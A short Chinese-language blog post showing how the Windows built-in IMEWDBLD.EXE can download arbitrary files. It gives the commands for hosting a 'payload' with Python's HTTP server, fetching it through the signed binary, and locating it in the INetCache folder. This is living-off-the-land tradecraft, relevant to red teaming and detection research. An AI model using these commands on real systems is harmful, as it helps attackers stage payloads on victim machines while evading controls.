---
title: 通过Windows自带程序IMEWDBLD.EXE下载任意文件
typora-root-url: ../
---

本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。

<div style="text-align: right"> 小维</div>

```
# 环境介绍
OS 名称: Microsoft Windows 10 专业版
OS 版本: 10.0.18363 暂缺 Build 18363
```

<!--more-->

```powershell
#通过HTTP服务托管载荷（这里使用了python3起个简易的HTTP服务）
python3 -m http.server

#通过IMEWDBLD.EXE下载任意文件
C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE http://10.200.73.104/download.txt

#查找文件存储路径
forfiles /P "%localappdata%\Microsoft\Windows\INetCache" /S /M * /C "cmd /c echo @path"
#参数介绍
/P 表示开始搜索的路径。默认文件夹是当前工作的 目录 (.)。
/S 指导 forfiles 递归到子目录。像 "DIR /S"。
/M 根据搜索掩码搜索文件。默认搜索掩码是 '*'。
/C 表示为每个文件执行的命令。命令字符串应该用双引号括起来。
	@path 返回文件的完整路径。
```

![image-20210420133444561](/img/%E9%80%9A%E8%BF%87Windows%E8%87%AA%E5%B8%A6%E7%A8%8B%E5%BA%8FIMEWDBLD.EXE%E4%B8%8B%E8%BD%BD%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20210420130233187.png)

